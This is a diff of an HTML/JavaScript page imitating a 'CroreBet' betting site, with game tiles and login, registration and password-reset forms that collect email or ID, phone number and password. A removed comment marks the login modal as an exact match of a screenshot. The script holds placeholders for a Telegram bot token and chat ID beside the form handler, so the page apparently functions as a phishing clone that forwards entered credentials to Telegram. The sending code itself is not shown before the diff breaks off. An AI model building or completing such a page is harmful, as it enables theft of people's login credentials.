@@ -9,7 +9,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
   <style>
     body {
-      font-family: 'Inter', sans-serif;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
       background-color: #ffffff;
       color: #111827;
       padding-bottom: 76px;
@@ -23,7 +23,7 @@
       scrollbar-width: none;
     }
     .brand-yellow {
-      background-color: #f6b900;
+      background-color: #f5b800;
     }
     .brand-green {
       background-color: #00b843;
@@ -47,7 +47,7 @@
   <!-- TOP STICKY HEADER -->
   <header class="sticky top-0 z-30 bg-white border-b border-gray-100 px-3.5 py-2.5 flex items-center justify-between">
     <div class="flex items-center gap-4">
-      <button onclick="openDrawer()" class="text-gray-800 text-xl focus:outline-none">
+      <button type="button" onclick="openDrawer()" class="text-gray-800 text-xl focus:outline-none">
         <i class="fa-solid fa-bars"></i>
       </button>
       <a href="#support" class="text-gray-800 text-xl">
@@ -57,7 +57,7 @@
 
     <a href="#" class="bg-black text-white font-black tracking-tight px-2.5 py-1 rounded-md text-sm flex items-center gap-1 shadow-sm">
       <span>CRORE</span>
-      <span class="bg-[#f6b900] text-black px-1.5 py-0.2 rounded text-xs font-extrabold">BET</span>
+      <span class="bg-[#f5b800] text-black px-1.5 py-0.2 rounded text-xs font-extrabold">BET</span>
     </a>
 
     <div class="flex items-center gap-3.5">
@@ -66,17 +66,17 @@
       </a>
       <a href="#download-android" class="relative text-gray-700 text-xl flex flex-col items-center">
         <i class="fa-brands fa-android"></i>
-        <span class="bg-[#f6b900] text-black text-[8px] font-extrabold px-1 rounded leading-tight -mt-1">NEW</span>
+        <span class="bg-[#f5b800] text-black text-[8px] font-extrabold px-1 rounded leading-tight -mt-1">NEW</span>
       </a>
     </div>
   </header>
 
   <!-- LOG IN & REGISTRATION BUTTONS -->
   <div class="px-3.5 pt-3 pb-2 grid grid-cols-2 gap-2.5 bg-white">
-    <button onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 text-gray-900 font-extrabold text-sm py-3 rounded-xl shadow-sm transition active:scale-95">
+    <button type="button" onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 text-gray-900 font-extrabold text-sm py-3 rounded-xl shadow-sm transition active:scale-95">
       LOG IN
     </button>
-    <button onclick="openModal('registerModal')" class="brand-green hover:bg-green-600 text-white font-extrabold text-sm py-3 rounded-xl shadow-sm transition active:scale-95">
+    <button type="button" onclick="openModal('registerModal')" class="brand-green hover:bg-green-600 text-white font-extrabold text-sm py-3 rounded-xl shadow-sm transition active:scale-95">
       REGISTRATION
     </button>
   </div>
@@ -91,42 +91,42 @@
 
   <!-- 8 YELLOW QUICK-CATEGORY TILES -->
   <div class="px-3.5 py-2 grid grid-cols-4 gap-2 bg-white">
-    <button onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
+    <button type="button" onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
       <i class="fa-solid fa-plane-up text-lg"></i>
       <span class="text-[11px] font-extrabold leading-tight text-center">JetX</span>
     </button>
 
-    <button onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
+    <button type="button" onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
       <i class="fa-solid fa-trophy text-lg"></i>
       <span class="text-[11px] font-extrabold leading-tight text-center">Sports</span>
     </button>
 
-    <button onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
+    <button type="button" onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
       <i class="fa-solid fa-user-tie text-lg"></i>
       <span class="text-[11px] font-extrabold leading-tight text-center">Live Casino</span>
     </button>
 
-    <button onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
-      <span class="w-5 h-5 rounded-full bg-gray-900 text-[#f6b900] text-[8px] font-black flex items-center justify-center">PLAY</span>
+    <button type="button" onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
+      <span class="w-5 h-5 rounded-full bg-gray-900 text-[#f5b800] text-[8px] font-black flex items-center justify-center">PLAY</span>
       <span class="text-[11px] font-extrabold leading-tight text-center">Pragmatic</span>
     </button>
 
-    <button onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
+    <button type="button" onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
       <i class="fa-solid fa-volcano text-lg"></i>
       <span class="text-[11px] font-extrabold leading-tight text-center">Coin Volcano</span>
     </button>
 
-    <button onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
+    <button type="button" onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
       <i class="fa-solid fa-plane text-lg"></i>
       <span class="text-[11px] font-extrabold leading-tight text-center">Aviator</span>
     </button>
 
-    <button onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
+    <button type="button" onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
       <i class="fa-solid fa-circle-half-stroke text-lg"></i>
       <span class="text-[11px] font-extrabold leading-tight text-center">Evolution</span>
     </button>
 
-    <button onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
+    <button type="button" onclick="openModal('loginModal')" class="brand-yellow hover:bg-yellow-500 rounded-xl py-2.5 px-1.5 flex flex-col items-center justify-center gap-1.5 text-gray-900 shadow-xs active:scale-95 transition">
       <i class="fa-solid fa-baseball-bat-ball text-lg"></i>
       <span class="text-[11px] font-extrabold leading-tight text-center">Cricket</span>
     </button>
@@ -148,7 +148,6 @@
       </div>
 
       <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
-        <!-- Aviator Graphic Card -->
         <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="aviator spribe crash">
           <div class="game-thumb">
             <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
@@ -169,7 +168,6 @@
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Aviator</p>
         </div>
 
-        <!-- Aviatrix Graphic Card -->
         <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="aviatrix crorebet crash">
           <div class="game-thumb">
             <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
@@ -187,7 +185,7 @@
               <path d="M40 52 L76 44 L64 62 Z" fill="#facc15"/>
               <text x="108" y="92" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-style="italic" font-weight="900" font-size="25">Aviatrix</text>
               <rect x="64" y="102" width="92" height="18" rx="4" fill="#09090b"/>
-              <text x="110" y="114" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="10">CRORE <tspan fill="#f6b900">BET</tspan></text>
+              <text x="110" y="114" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="10">CRORE <tspan fill="#f5b800">BET</tspan></text>
             </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Aviatrix</p>
@@ -208,22 +206,22 @@
       </div>
 
       <div class="flex gap-2.5 overflow-x-auto no-scrollbar pb-1">
-        <button onclick="openModal('loginModal')" class="game-card min-w-[92px] brand-yellow rounded-xl py-3 px-2 flex flex-col items-center justify-center gap-1.5 shadow-xs active:scale-95 transition" data-name="cricket sports">
+        <button type="button" onclick="openModal('loginModal')" class="game-card min-w-[92px] brand-yellow rounded-xl py-3 px-2 flex flex-col items-center justify-center gap-1.5 shadow-xs active:scale-95 transition" data-name="cricket sports">
           <span class="text-2xl">🏏</span>
           <span class="text-xs font-extrabold text-gray-900">Cricket</span>
         </button>
 
-        <button onclick="openModal('loginModal')" class="game-card min-w-[92px] brand-yellow rounded-xl py-3 px-2 flex flex-col items-center justify-center gap-1.5 shadow-xs active:scale-95 transition" data-name="football sports">
+        <button type="button" onclick="openModal('loginModal')" class="game-card min-w-[92px] brand-yellow rounded-xl py-3 px-2 flex flex-col items-center justify-center gap-1.5 shadow-xs active:scale-95 transition" data-name="football sports">
           <span class="text-2xl">⚽</span>
           <span class="text-xs font-extrabold text-gray-900">Football</span>
         </button>
 
-        <button onclick="openModal('loginModal')" class="game-card min-w-[92px] brand-yellow rounded-xl py-3 px-2 flex flex-col items-center justify-center gap-1.5 shadow-xs active:scale-95 transition" data-name="ecricket sports">
+        <button type="button" onclick="openModal('loginModal')" class="game-card min-w-[92px] brand-yellow rounded-xl py-3 px-2 flex flex-col items-center justify-center gap-1.5 shadow-xs active:scale-95 transition" data-name="ecricket sports">
           <span class="text-2xl">🎮</span>
           <span class="text-xs font-extrabold text-gray-900">Ecricket</span>
         </button>
 
-        <button onclick="openModal('loginModal')" class="game-card min-w-[92px] brand-yellow rounded-xl py-3 px-2 flex flex-col items-center justify-center gap-1.5 shadow-xs active:scale-95 transition" data-name="basketball sports">
+        <button type="button" onclick="openModal('loginModal')" class="game-card min-w-[92px] brand-yellow rounded-xl py-3 px-2 flex flex-col items-center justify-center gap-1.5 shadow-xs active:scale-95 transition" data-name="basketball sports">
           <span class="text-2xl">🏀</span>
           <span class="text-xs font-extrabold text-gray-900 truncate">Basketbal</span>
         </button>
@@ -243,7 +241,6 @@
       </div>
 
       <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
-        <!-- Dragon Tiger Graphic Card -->
         <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="dragon tiger live evolution">
           <div class="game-thumb">
             <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
@@ -265,7 +262,6 @@
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Dragon Tiger</p>
         </div>
 
-        <!-- Ice Fishing Graphic Card -->
         <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="ice fishing live evolution">
           <div class="game-thumb">
             <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
@@ -302,7 +298,6 @@
       </div>
 
       <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
-        <!-- Fortune Garuda 500 Graphic Card -->
         <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="fortune garuda 500 jili slots">
           <div class="game-thumb">
             <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
@@ -324,7 +319,6 @@
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5 truncate">Fortune Garuda 500</p>
         </div>
 
-        <!-- 777 Coins Graphic Card -->
         <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="777 coins 3 oaks slots">
           <div class="game-thumb">
             <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
@@ -361,7 +355,6 @@
       </div>
 
       <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
-        <!-- JetX Graphic Card -->
         <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="jetx smartsoft popular">
           <div class="game-thumb">
             <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
@@ -381,7 +374,6 @@
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">JetX</p>
         </div>
 
-        <!-- Coin Volcano Graphic Card -->
         <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="coin volcano 3 oaks popular">
           <div class="game-thumb">
             <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
@@ -462,7 +454,6 @@
       </div>
 
       <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
-        <!-- Chicken Road 2 -->
         <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="chicken road 2 crorebet exclusives">
           <div class="game-thumb">
             <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
@@ -477,13 +468,12 @@
               <polygon points="102,22 110,12 118,22" fill="#ef4444"/>
               <text x="110" y="84" text-anchor="middle" fill="#fef08a" font-family="Inter, sans-serif" font-weight="900" font-size="16">CHICKEN ROAD 2</text>
               <rect x="64" y="98" width="92" height="17" rx="4" fill="#09090b"/>
-              <text x="110" y="110" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="10">CRORE <tspan fill="#f6b900">BET</tspan></text>
+              <text x="110" y="110" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="10">CRORE <tspan fill="#f5b800">BET</tspan></text>
             </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Chicken Road 2</p>
         </div>
 
-        <!-- Chicken Road -->
         <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="chicken road crorebet exclusives">
           <div class="game-thumb">
             <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
@@ -498,7 +488,7 @@
               <polygon points="102,22 110,12 118,22" fill="#ef4444"/>
               <text x="110" y="84" text-anchor="middle" fill="#fde047" font-family="Inter, sans-serif" font-weight="900" font-size="17">CHICKEN ROAD</text>
               <rect x="64" y="98" width="92" height="17" rx="4" fill="#09090b"/>
-              <text x="110" y="110" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="10">CRORE <tspan fill="#f6b900">BET</tspan></text>
+              <text x="110" y="110" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="10">CRORE <tspan fill="#f5b800">BET</tspan></text>
             </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Chicken Road</p>
@@ -549,7 +539,7 @@
       <div class="bg-white px-4 py-6 flex flex-col items-center space-y-4">
         <div class="bg-black text-white font-black tracking-tight px-3 py-1 rounded-md text-base flex items-center gap-1">
           <span>CRORE</span>
-          <span class="bg-[#f6b900] text-black px-1.5 rounded text-sm font-extrabold">BET</span>
+          <span class="bg-[#f5b800] text-black px-1.5 rounded text-sm font-extrabold">BET</span>
         </div>
 
         <div class="w-full bg-gray-100 rounded-xl px-3.5 py-2.5 flex items-center justify-between text-xs font-semibold text-gray-800">
@@ -575,7 +565,7 @@
             <a href="https://t.me/" target="_blank" class="w-8 h-8 rounded-lg bg-sky-500 flex items-center justify-center text-white text-sm">
               <i class="fa-brands fa-telegram"></i>
             </a>
-            <button class="brand-yellow text-gray-900 font-extrabold text-xs px-3.5 py-2 rounded-lg">
+            <button type="button" class="brand-yellow text-gray-900 font-extrabold text-xs px-3.5 py-2 rounded-lg">
               CHAT
             </button>
           </div>
@@ -680,12 +670,12 @@
   <div id="sideDrawer" class="fixed inset-0 z-50 bg-white max-w-md mx-auto hidden flex-col justify-between p-4 overflow-y-auto">
     <div>
       <div class="flex items-center gap-4 pb-4">
-        <button onclick="closeDrawer()" class="text-gray-800 text-xl">
+        <button type="button" onclick="closeDrawer()" class="text-gray-800 text-xl">
           <i class="fa-solid fa-xmark"></i>
         </button>
         <div class="bg-black text-white font-black tracking-tight px-2.5 py-1 rounded-md text-sm flex items-center gap-1">
           <span>CRORE</span>
-          <span class="bg-[#f6b900] text-black px-1.5 rounded text-xs font-extrabold">BET</span>
+          <span class="bg-[#f5b800] text-black px-1.5 rounded text-xs font-extrabold">BET</span>
         </div>
       </div>
 
@@ -707,19 +697,19 @@
 
       <p class="text-[11px] font-bold text-gray-400 uppercase mb-2">ACCOUNT</p>
       <div class="space-y-2.5 mb-5">
-        <button onclick="closeDrawer(); openModal('loginModal')" class="w-full flex items-center gap-3 text-xs font-bold text-gray-900">
+        <button type="button" onclick="closeDrawer(); openModal('loginModal')" class="w-full flex items-center gap-3 text-xs font-bold text-gray-900">
           <span class="w-9 h-9 rounded-lg bg-gray-100 flex items-center justify-center"><i class="fa-solid fa-user"></i></span>
           Profile
         </button>
-        <button onclick="closeDrawer(); openModal('loginModal')" class="w-full flex items-center gap-3 text-xs font-bold text-gray-900">
+        <button type="button" onclick="closeDrawer(); openModal('loginModal')" class="w-full flex items-center gap-3 text-xs font-bold text-gray-900">
           <span class="w-9 h-9 rounded-lg bg-gray-100 flex items-center justify-center"><i class="fa-solid fa-clock-rotate-left"></i></span>
           Payment History
         </button>
-        <button onclick="closeDrawer(); openModal('loginModal')" class="w-full flex items-center gap-3 text-xs font-bold text-gray-900">
+        <button type="button" onclick="closeDrawer(); openModal('loginModal')" class="w-full flex items-center gap-3 text-xs font-bold text-gray-900">
           <span class="w-9 h-9 rounded-lg bg-gray-100 flex items-center justify-center"><i class="fa-solid fa-fire"></i></span>
           Bet History
         </button>
-        <button onclick="closeDrawer(); openModal('loginModal')" class="w-full flex items-center gap-3 text-xs font-bold text-gray-900">
+        <button type="button" onclick="closeDrawer(); openModal('loginModal')" class="w-full flex items-center gap-3 text-xs font-bold text-gray-900">
           <span class="w-9 h-9 rounded-lg bg-gray-100 flex items-center justify-center"><i class="fa-solid fa-dollar-sign"></i></span>
           Money Withdrawal
         </button>
@@ -752,28 +742,27 @@
 
     <div class="pt-6 space-y-3">
       <p class="text-[10px] text-gray-400 text-center">18+ | Copyright © 2026 crorebet. | All rights reserved and protected by law</p>
-      <button onclick="closeDrawer(); openModal('loginModal')" class="w-full brand-green text-white font-extrabold text-sm py-3 rounded-xl shadow">
+      <button type="button" onclick="closeDrawer(); openModal('loginModal')" class="w-full brand-green text-white font-extrabold text-sm py-3 rounded-xl shadow">
         DEPOSIT
       </button>
     </div>
   </div>
 
-  <!-- MODAL 1: LOG IN (Exact match with 12375_3.jpg) -->
+  <!-- MODAL 1: LOG IN -->
   <div id="loginModal" class="fixed inset-0 z-50 bg-black/60 hidden items-center justify-center p-4">
     <div class="bg-white w-full max-w-sm rounded-3xl p-5 relative shadow-2xl">
       <div class="flex items-center justify-between mb-4">
         <i class="fa-regular fa-comments text-gray-700 text-xl"></i>
         <h3 class="font-extrabold text-lg text-gray-900 tracking-tight">LOG IN</h3>
-        <button onclick="closeModals()" class="w-8 h-8 rounded-xl bg-gray-100 text-gray-700 flex items-center justify-center">
+        <button type="button" onclick="closeModals()" class="w-8 h-8 rounded-xl bg-gray-100 text-gray-700 flex items-center justify-center">
           <i class="fa-solid fa-xmark text-sm"></i>
         </button>
       </div>
 
       <p class="text-xs text-gray-700 mb-3.5">
-        New user? <button onclick="switchModal('registerModal')" class="font-bold text-[#f6b900]">Registration</button>
+        New user? <button type="button" onclick="switchModal('registerModal')" class="font-bold text-[#f5b800]">Registration</button>
       </p>
 
-      <!-- Tabs: Email or ID (Yellow active default) / Phone -->
       <div class="grid grid-cols-2 gap-2.5 mb-3.5">
         <button id="tabEmailBtn" type="button" onclick="switchLoginTab('email')" class="brand-yellow text-gray-900 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2 shadow-2xs">
           <i class="fa-solid fa-envelope text-sm"></i> Email or ID
@@ -784,20 +773,17 @@
       </div>
 
       <form onsubmit="handleFormSubmit(event, 'Login')" class="space-y-3">
-        <!-- Email / Account ID Input (Default visible) -->
         <div id="emailInputWrap" class="bg-gray-100 rounded-xl overflow-hidden">
-          <input type="text" placeholder="Email/Account ID" class="w-full bg-transparent px-3.5 py-3.5 text-xs text-gray-900 placeholder-gray-400 focus:outline-none" />
+          <input id="loginEmailInput" type="text" placeholder="Email/Account ID" class="w-full bg-transparent px-3.5 py-3.5 text-xs text-gray-900 placeholder-gray-400 focus:outline-none" />
         </div>
 
-        <!-- Phone Input (Hidden until Phone tab clicked) -->
-        <div id="phoneInputWrap" class="hidden flex bg-gray-100 rounded-xl overflow-hidden">
-          <span class="px-3 py-3.5 text-xs font-bold text-gray-800 border-r border-gray-200 flex items-center gap-1.5">
+        <div id="phoneInputWrap" class="hidden flex items-center gap-2">
+          <span class="bg-gray-100 rounded-xl px-3.5 py-3.5 text-xs font-bold text-gray-800 flex items-center gap-1.5 shrink-0">
             🇮🇳 +91
           </span>
-          <input type="tel" placeholder="Phone number" class="w-full bg-transparent px-3 py-3.5 text-xs text-gray-900 placeholder-gray-400 focus:outline-none" />
+          <input id="loginPhoneInput" type="tel" placeholder="Phone number" class="w-full bg-gray-100 rounded-xl px-3.5 py-3.5 text-xs text-gray-900 placeholder-gray-400 focus:outline-none" />
         </div>
 
-        <!-- Password Input -->
         <div class="flex items-center bg-gray-100 rounded-xl px-3.5">
           <input id="loginPass" type="password" placeholder="Password" class="w-full bg-transparent py-3.5 text-xs text-gray-900 placeholder-gray-400 focus:outline-none" />
           <button type="button" onclick="togglePass('loginPass')" class="text-gray-800 text-sm pl-2">
@@ -806,10 +792,10 @@
         </div>
 
         <p class="text-xs text-gray-700 pt-0.5">
-          Forgot password? <button type="button" onclick="switchModal('resetModal')" class="font-bold text-[#f6b900]">Reset</button>
+          Forgot password? <button type="button" onclick="switchModal('resetModal')" class="font-bold text-[#f5b800]">Reset</button>
         </p>
 
-        <button type="submit" class="w-full bg-gray-200 hover:bg-[#f6b900] text-gray-500 hover:text-gray-900 font-extrabold text-xs py-3.5 rounded-xl transition">
+        <button type="submit" class="w-full bg-gray-200 hover:bg-[#f5b800] text-gray-500 hover:text-gray-900 font-extrabold text-xs py-3.5 rounded-xl transition">
           LOG IN
         </button>
       </form>
@@ -833,34 +819,49 @@
     </div>
   </div>
 
-  <!-- MODAL 2: RECOVER PASSWORD -->
+  <!-- MODAL 2: RECOVER PASSWORD (Working Email & Phone Tabs) -->
   <div id="resetModal" class="fixed inset-0 z-50 bg-black/60 hidden items-center justify-center p-4">
     <div class="bg-white w-full max-w-sm rounded-3xl p-5 relative shadow-2xl">
       <div class="flex items-center justify-between mb-4">
-        <span class="w-7"></span>
-        <h3 class="font-extrabold text-base text-gray-900">Recover a password</h3>
-        <button onclick="closeModals()" class="w-7 h-7 rounded-lg bg-gray-100 text-gray-600 flex items-center justify-center">
-          <i class="fa-solid fa-xmark text-xs"></i>
+        <span class="w-8"></span>
+        <h3 class="font-extrabold text-[17px] text-gray-900 tracking-tight">Recover a password</h3>
+        <button type="button" onclick="closeModals()" class="w-8 h-8 rounded-xl bg-gray-100 text-gray-700 flex items-center justify-center">
+          <i class="fa-solid fa-xmark text-sm"></i>
         </button>
       </div>
 
-      <div class="grid grid-cols-2 gap-2 mb-4">
-        <button type="button" class="brand-yellow text-gray-900 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5">
-          <i class="fa-solid fa-envelope"></i> Email
+      <div class="grid grid-cols-2 gap-2.5 mb-4">
+        <button id="resetEmailTabBtn" type="button" onclick="switchResetTab('email')" class="brand-yellow text-gray-900 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2 shadow-2xs">
+          <i class="fa-solid fa-envelope text-sm"></i> Email
         </button>
-        <button type="button" class="bg-gray-100 text-gray-800 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5">
-          <i class="fa-solid fa-phone"></i> Phone
+        <button id="resetPhoneTabBtn" type="button" onclick="switchResetTab('phone')" class="bg-gray-100 text-gray-800 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2">
+          <i class="fa-solid fa-phone text-sm"></i> Phone
         </button>
       </div>
 
-      <p class="text-xs text-gray-600 text-center mb-4">Fill your email and we send you new password</p>
+      <p id="resetInstructionText" class="text-[13px] text-gray-700 text-center leading-snug mb-4 px-2">
+        Fill your email and we send you new password
+      </p>
 
       <form onsubmit="handleFormSubmit(event, 'Password Reset')" class="space-y-2.5">
-        <input type="email" placeholder="Email" required class="w-full bg-gray-100 rounded-xl px-3.5 py-3 text-xs focus:outline-none" />
-        <button type="button" onclick="switchModal('loginModal')" class="w-full border border-gray-200 text-gray-900 font-bold text-xs py-3 rounded-xl">
+        <!-- Email Reset Input -->
+        <div id="resetEmailWrap">
+          <input id="resetEmailInput" type="email" placeholder="Email" class="w-full bg-gray-100 rounded-xl px-3.5 py-3.5 text-xs text-gray-900 placeholder-gray-400 focus:outline-none" />
+        </div>
+
+        <!-- Phone Reset Input -->
+        <div id="resetPhoneWrap" class="hidden flex items-center gap-2">
+          <span class="bg-gray-100 rounded-xl px-3.5 py-3.5 text-xs font-bold text-gray-800 flex items-center gap-1.5 shrink-0">
+            🇮🇳 +91
+          </span>
+          <input id="resetPhoneInput" type="tel" placeholder="Phone number" class="w-full bg-gray-100 rounded-xl px-3.5 py-3.5 text-xs text-gray-900 placeholder-gray-400 focus:outline-none" />
+        </div>
+
+        <button type="button" onclick="switchModal('loginModal')" class="w-full border border-gray-200 hover:bg-gray-50 text-gray-900 font-bold text-xs py-3.5 rounded-xl transition">
           Back
         </button>
-        <button type="submit" class="w-full bg-gray-200 hover:bg-[#f6b900] text-gray-600 hover:text-gray-900 font-extrabold text-xs py-3 rounded-xl transition">
+
+        <button type="submit" class="w-full bg-gray-200 hover:bg-[#f5b800] text-gray-600 hover:text-gray-900 font-extrabold text-xs py-3.5 rounded-xl transition">
           Reset
         </button>
       </form>
@@ -873,25 +874,25 @@
       <div class="flex items-center justify-between mb-3">
         <i class="fa-regular fa-comments text-gray-700 text-lg"></i>
         <h3 class="font-extrabold text-base text-gray-900">REGISTRATION</h3>
-        <button onclick="closeModals()" class="w-7 h-7 rounded-lg bg-gray-100 text-gray-600 flex items-center justify-center">
+        <button type="button" onclick="closeModals()" class="w-7 h-7 rounded-lg bg-gray-100 text-gray-600 flex items-center justify-center">
           <i class="fa-solid fa-xmark text-xs"></i>
         </button>
       </div>
 
       <p class="text-xs text-gray-600 mb-3">
-        Have an account? <button type="button" onclick="switchModal('loginModal')" class="font-bold text-[#f6b900]">Log In</button>
+        Have an account? <button type="button" onclick="switchModal('loginModal')" class="font-bold text-[#f5b800]">Log In</button>
       </p>
 
       <form onsubmit="handleFormSubmit(event, 'Registration')" class="space-y-3">
-        <div class="flex bg-gray-100 rounded-xl overflow-hidden">
-          <span class="px-3 py-3 text-xs font-bold text-gray-800 border-r border-gray-200 flex items-center gap-1.5">
+        <div class="flex items-center gap-2">
+          <span class="bg-gray-100 rounded-xl px-3.5 py-3 text-xs font-bold text-gray-800 flex items-center gap-1.5 shrink-0">
             🇮🇳 +91
           </span>
-          <input type="tel" placeholder="Phone number" required class="w-full bg-transparent px-3 py-3 text-xs focus:outline-none" />
+          <input type="tel" placeholder="Phone number" required class="w-full bg-gray-100 rounded-xl px-3.5 py-3 text-xs text-gray-900 placeholder-gray-400 focus:outline-none" />
         </div>
 
         <div class="flex items-center bg-gray-100 rounded-xl px-3.5">
-          <input id="regPass" type="password" placeholder="Password" required class="w-full bg-transparent py-3 text-xs focus:outline-none" />
+          <input id="regPass" type="password" placeholder="Password" required class="w-full bg-transparent py-3 text-xs text-gray-900 placeholder-gray-400 focus:outline-none" />
           <button type="button" onclick="togglePass('regPass')" class="text-gray-500 text-xs">
             <i class="fa-regular fa-eye-slash"></i>
           </button>
@@ -941,6 +942,8 @@
     const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
     const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
 
+    let activeResetTab = "email";
+
     function openDrawer() {
       const drawer = document.getElementById('sideDrawer');
       drawer.classList.remove('hidden');
@@ -958,6 +961,9 @@
       const modal = document.getElementById(id);
       modal.classList.remove('hidden');
       modal.classList.add('flex');
+      if (id === 'resetModal') {
+        switchResetTab('email');
+      }
     }
 
     function closeModals() {
@@ -988,6 +994,35 @@
         emailWrap.classList.add('hidden');
         tabPhoneBtn.className = 'brand-yellow text-gray-900 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2 shadow-2xs';
         tabEmailBtn.className = 'bg-gray-100 text-gray-800 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2';
+      }
+    }
+
+    function switchResetTab(tab) {
+      activeResetTab = tab;
+      const emailBtn = document.getElementById('resetEmailTabBtn');
+      const phoneBtn = document.getElementById('resetPhoneTabBtn');
+      const instruction = document.getElementById('resetInstructionText');
+      const emailWrap = document.getElementById('resetEmailWrap');
+      const phoneWrap = document.getElementById('resetPhoneWrap');
+      const emailInput = document.getElementById('resetEmailInput');
+      const phoneInput = document.getElementById('resetPhoneInput');
+
+      if (tab === 'email') {
